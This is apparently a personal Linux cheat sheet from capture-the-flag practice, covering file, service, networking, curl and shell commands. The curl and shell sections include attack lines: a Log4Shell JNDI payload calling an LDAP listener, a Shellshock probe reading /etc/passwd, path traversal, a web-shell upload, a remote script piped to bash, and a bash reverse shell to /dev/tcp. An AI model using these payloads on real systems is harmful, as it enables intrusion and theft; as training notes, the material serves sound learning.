# Linux commands

## Summary
* [Basic commands](#basic-commands)
* [Service commands](#service-commands)
* [Networking commands](#networking-commands)
* [Curl](#curl)
* [GCC to CC](#gcc-to-cc)
* [Shells](#shells)

### Basic commands
```
whoami - prints information about users
su - switch user
pwd - print working directory
cd - change directory
ls - list directory
mkdir - create a directory
rmdir - remove a directory
touch - create a file
rm - remove a file or directory
cp - copy a file or directory
scp - securely copy files or directories between two system
mv - rename or move a file or directory
cat - prints the contents of a file
less - show the contents of a file
clear - clear the terminal
tree - display folder structure
nano - open a text editor
grep - show the lines matching pattern
tr - replace the characters with other set of characters
cut - extract characters, fields from a file
chown - change the ownership of a file or directory
chmod - change the mode of a file or directory
/etc/shadow - where user passwords are stored
/etc/passwd - where user informations are stored
unzip [file] - unzip a zip file  //   7z e [file]  {alternative}
grep -iR [keyword] [directory path] 2>/dev/null {search for specific keyword in a directory}
rm *[strings]* - delete all files with particular strings
tar -xvf [tar file] - unzipping tar file
echo "[text]" | sudo tee -a [file name]  -add text to a file
wget --user=[username] --password=[password] [url] -- download file from website
gpg --import [private gpg file]
gpg --decrypt [gpg message block]
gpg --decrypt-file [gpg message block]
hostname
uname -a
/proc/version
/etc/issue
ps -A
ps aux
ps axjf
env
sudo -l
id
/etc/passwd | cut -d ":" -f 1
/etc/passwd | grep home
history
ss -ltp {for listening services} 
ip route
netstat -l   {for listening services}
netstat -at / -au  {for tcp or udp}
netstat -a   {for listening and established connection}
netstat -s
netstat -tp 
netstat -i
netstat -ano
netstat -ant
netstat -anu
ltrace /usr/bin/nano --> find out more about a program's binary
rpcinfo -p | grep nfs --> see what port rpc is running on
find / -type f -perm -04000 -ls 2>/dev/null: list files with suid & sgid bit set
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
find / -size +50M: find files that is larger than 50 MB size
find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
find / -type f -group users 2>/dev/null:Find files with a specific group id which in this case is users
find / -name '*[name]*' -type f 2>/dev/null | grep -ivE "(firefox|firewall)"
grep -R "THM{" * 2>/dev/null --> grab specific words in a file
grep -iR word /path/ 2>/dev/null --> grab specific words in a directory
find / -type f -name "*flag*" 2>/dev/null --> find files with a name
awk '{print $4 ":" $6}' users > userpass --> merge 2 list with a colon
```

### Service commands
```
service apache2 start/stop/restart/status
service postgresql start/stop/restart/status
apt install - installs a package
apt remove - removes a package
apt purge - removes packages with config
apt update - refreshes repository index
apt upgrade - upgrades all upgradable packages
apt autoremove - removes unwanted packages
apt search - searches for programs
apt list - list packages with criteria
```

### Networking commands
```
ping - to see if a network is active
ifconfig - view the configuration of a network interfaces
iwconfig - display and change the parameters of network interfaces
hciconfig - configure bluetooth devices
arp - associates between ip addresses with mac addresses
netstat - displays contents of network related data structures
route - prints the routing table
netdiscover - scan for live hosts in local network
hping3 - display target replies like ping does with ICMP replies.
```

### Curl
#### https://cheatsheet.dennyzhang.com/cheatsheet-curl-a4

Curl logic
```
curl 'http://10.10.189.232:8983/solr/admin/cores?foo=$\{jndi:ldap://10.4.64.135:4444\}'
if there is a $ sign in your url, then you should wrap the url with single quotes
escape out of the {} curly braces with a single backslash character
```
Change HTTP methods
```
curl -X [methods] [url]
```
Send a GET requests
```
curl -i [url]
```
Send a post request
```
curl -i [url] --data '[data]'
```
Set cookie for a request
```
curl -i [url] -b "name:value"
```
Specify HTTP header & sending a POST data
```
curl '[url] -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=[username]&email=[host email]'
```
Cookie tampering with Curl
```
curl [url] -H 'Cookie: logged-in=true; admin=true'
```
Upload files
```
curl [url] -u [creds:creds] --upload-file shell.php
```
Run bash script from local machine on remote machine
```
curl [ip]:[port]/[file name] | bash 
```
Download files
```
curl [url] --output [file]
```
Grep details from requests
```
curl -s [url] | grep img
```
Test for Shellshock vulnerability
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.155.108//cgi-bin/test.cgi
```
Send data as it is
```
curl --path-as-is http://example.com/.././../etc/passwd
```
Enumerate disallow web paths in robots.txt with bash & Curl
```
for i in `curl -s http://wekor.thm/robots.txt | grep Disallow | cut -d " " -f2`;do echo $i;curl -I http://wekor.thm$i;echo "---";done
```
Grep text from specific line & cut a character from the strings
```
curl -s 'http://example.com?page=id_rsa' | tail -n 39 | sed -s "s/#//g"
```

### GCC to CC
```
sed -i "s/gcc/cc/g" [exploit]
cc [exploit] -o [save]
```

### Shells

Stabilise shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Provide terms for shell
```
export TERM=xterm
```
Background a shell and re-enter
```
ctrl + z
stty raw -echo; fg
```
Reset terminal
```
reset
```
Stabilise shell with rlwrap
```
rlwrap nc -lvnp [port]
```
Reverse shell with bash script
```
echo '/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' > shell.sh
```
Automate process with bash script
```
for i in {1..100};do nc 127.0.0.1 $i;echo "";done ### this will execute netcat on 100 different ports respectively ###
```
